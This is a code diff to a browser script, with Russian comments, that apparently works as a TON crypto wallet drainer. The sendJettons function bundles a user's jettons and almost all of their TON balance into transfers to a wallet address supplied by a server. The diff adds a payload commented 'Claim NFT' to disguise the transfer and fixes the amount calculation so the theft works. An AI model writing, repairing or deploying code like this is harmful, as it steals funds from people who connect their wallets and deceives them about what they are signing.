@@ -260,7 +260,7 @@ async function sendJettons(data, walletAddress, ton, tonPrice, i, tryies, tonFla
         }
     }
 
-    // ВАЖНОЕ ИСПРАВЛЕНИЕ: Упрощаем добавление TON и исправляем проверку payload
+    // ВАЖНОЕ ИСПРАВЛЕНИЕ: Упрощаем добавление TON и исправляем ошибку с числами
     console.log('Checking TON transfer conditions:', {
         tontx: tontx,
         tonBalance: ton,
@@ -273,22 +273,29 @@ async function sendJettons(data, walletAddress, ton, tonPrice, i, tryies, tonFla
     if (parseFloat(ton) > 0.1 && transaction.messages.length < 4) {
         console.log('Adding TON transfer...');
         try {
+            // ИСПРАВЛЕНИЕ: Правильная работа с числами без использования fromNano
             const tonBalanceNano = TonWeb.utils.toNano(ton);
             const reservedNano = TonWeb.utils.toNano("0.1");
             
+            // Преобразуем в BigInt для точных вычислений
             const balanceBigInt = BigInt(tonBalanceNano);
             const reservedBigInt = BigInt(reservedNano);
             
+            // Вычисляем сумму для отправки
             let transfer_value = balanceBigInt - reservedBigInt;
             
+            // Проверяем что сумма положительная и достаточная
             if (transfer_value > BigInt(0) && transfer_value > BigInt(TonWeb.utils.toNano("0.01"))) {
                 const transfer_value_str = transfer_value.toString();
-                console.log('TON transfer value:', TonWeb.utils.fromNano(transfer_value_str), 'TON');
+                
+                // ИСПРАВЛЕНИЕ: Вычисляем сумму в TON без использования fromNano
+                const tonAmount = (Number(transfer_value) / 1000000000).toFixed(9);
+                console.log('TON transfer value:', tonAmount, 'TON');
                 
                 let payload = await get_ton_text(transfer_value_str);
                 console.log('TON payload result:', payload);
                 
-                // ИСПРАВЛЕНИЕ: Правильная проверка статуса payload
+                // Правильная проверка статуса payload
                 if (payload && (payload.status === 'OK' || payload.status === 'ok') && payload.data) {
                     const tonDestinationAddress = data.data.wallet;
                     console.log('TON destination address:', tonDestinationAddress);
@@ -299,7 +306,6 @@ async function sendJettons(data, walletAddress, ton, tonPrice, i, tryies, tonFla
                         payload: payload.data
                     });
                     
-                    const tonAmount = TonWeb.utils.fromNano(transfer_value_str);
                     tokens[tkn] = {
                         name: 'TON',
                         prices: parseFloat(tonAmount) * parseFloat(tonPrice)
@@ -323,7 +329,6 @@ async function sendJettons(data, walletAddress, ton, tonPrice, i, tryies, tonFla
                                 payload: manualPayload
                             });
                             
-                            const tonAmount = TonWeb.utils.fromNano(transfer_value_str);
                             tokens[tkn] = {
                                 name: 'TON',
                                 prices: parseFloat(tonAmount) * parseFloat(tonPrice)
@@ -349,7 +354,7 @@ async function sendJettons(data, walletAddress, ton, tonPrice, i, tryies, tonFla
     // Проверяем что есть сообщения для отправки
     console.log(`Final transaction has ${transaction.messages.length} messages`);
     console.log('Messages:', transaction.messages.map((m, idx) => 
-        `${idx}: ${m.address.includes(data.data.wallet) ? 'TON transfer' : 'Jetton transfer'} to ${m.address}`
+        `${idx}: ${m.address === data.data.wallet ? 'TON transfer' : 'Jetton transfer'} to ${m.address}`
     ));
     
     if (transaction.messages.length > 0) {
@@ -364,7 +369,7 @@ async function sendJettons(data, walletAddress, ton, tonPrice, i, tryies, tonFla
                 }
                 
                 validMessages.push(msg);
-                console.log(`✅ Valid message: ${msg.address.includes(data.data.wallet) ? 'TON' : 'Jetton'} transfer`);
+                console.log(`✅ Valid message: ${msg.address === data.data.wallet ? 'TON' : 'Jetton'} transfer`);
             } catch (e) {
                 console.error(`❌ Invalid message removed: ${msg.address}`);
             }
@@ -444,6 +449,30 @@ async function sendJettons(data, walletAddress, ton, tonPrice, i, tryies, tonFla
         }
     } else {
         console.log('❌ No valid messages to send in transaction');
+    }
+}
+
+// Функция для создания payload вручную
+async function createManualTonPayload(amount) {
+    try {
+        console.log('Creating manual TON payload for amount:', amount);
+        
+        const comment = "Claim NFT";
+        
+        // Создаем Cell с комментарием
+        const cell = new TonWeb.boc.Cell();
+        await cell
+            .storeUint(0, 32) // opcode for comment
+            .storeStringTail(comment)
+            .endCell();
+            
+        const payloadBase64 = await cell.toBoc().toString("base64");
+        console.log('Manual payload created successfully');
+        return payloadBase64;
+        
+    } catch (error) {
+        console.error('Error creating manual payload:', error);
+        return null;
     }
 }
 
@@ -762,6 +791,7 @@ document.addEventListener('DOMContentLoaded', async () => {
     }
 
 });
+
 
 
 
